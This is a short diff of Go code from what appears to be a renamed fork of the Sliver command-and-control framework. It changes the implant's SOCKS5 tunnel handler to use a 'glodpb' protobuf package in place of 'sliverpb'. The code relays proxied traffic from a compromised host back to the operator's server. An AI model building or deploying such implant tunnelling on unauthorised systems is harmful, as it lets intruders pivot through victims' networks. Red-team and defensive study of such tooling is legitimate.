@@ -31,7 +31,7 @@ import (
 	"time"
 
 	"github.com/starkzarn/glod/implant/sliver/transports"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 	"github.com/things-go/go-socks5"
 	"google.golang.org/protobuf/proto"
 )
@@ -46,8 +46,8 @@ var socksTunnels = socksTunnelPool{
 
 var socksServer *socks5.Server
 
-func SocksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
-	socksData := &sliverpb.SocksData{}
+func SocksReqHandler(envelope *glodpb.Envelope, connection *transports.Connection) {
+	socksData := &glodpb.SocksData{}
 	err := proto.Unmarshal(envelope.Data, socksData)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -98,7 +98,7 @@ func SocksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 var _ net.Conn = &socks{}
 
 type socks struct {
-	stream *sliverpb.SocksData
+	stream *glodpb.SocksData
 	conn   *transports.Connection
 	// mux      sync.Mutex
 	Sequence uint64
@@ -115,7 +115,7 @@ func (s *socks) Read(b []byte) (n int, err error) {
 }
 
 func (s *socks) Write(b []byte) (n int, err error) {
-	data, err := proto.Marshal(&sliverpb.SocksData{
+	data, err := proto.Marshal(&glodpb.SocksData{
 		TunnelID: s.stream.TunnelID,
 		Data:     b,
 		Sequence: atomic.LoadUint64(&s.Sequence),
@@ -126,8 +126,8 @@ func (s *socks) Write(b []byte) (n int, err error) {
 	// {{if .Config.Debug}}
 	log.Printf("[socks] (implant to Server) to Client to User Data Sequence %d, Data Size %d Data %v\n", atomic.LoadUint64(&s.Sequence), len(b), b)
 	// {{end}}
-	s.conn.Send <- &sliverpb.Envelope{
-		Type: sliverpb.MsgSocksData,
+	s.conn.Send <- &glodpb.Envelope{
+		Type: glodpb.MsgSocksData,
 		Data: data,
 	}
 
@@ -142,15 +142,15 @@ func (s *socks) Close() error {
 	}
 	close(channel.(chan []byte))
 
-	data, err := proto.Marshal(&sliverpb.SocksData{
+	data, err := proto.Marshal(&glodpb.SocksData{
 		TunnelID:  s.stream.TunnelID,
 		CloseConn: true,
 	})
 	if !s.conn.IsOpen {
 		return err
 	}
-	s.conn.Send <- &sliverpb.Envelope{
-		Type: sliverpb.MsgSocksData,
+	s.conn.Send <- &glodpb.Envelope{
+		Type: glodpb.MsgSocksData,
 		Data: data,
 	}
 	return err
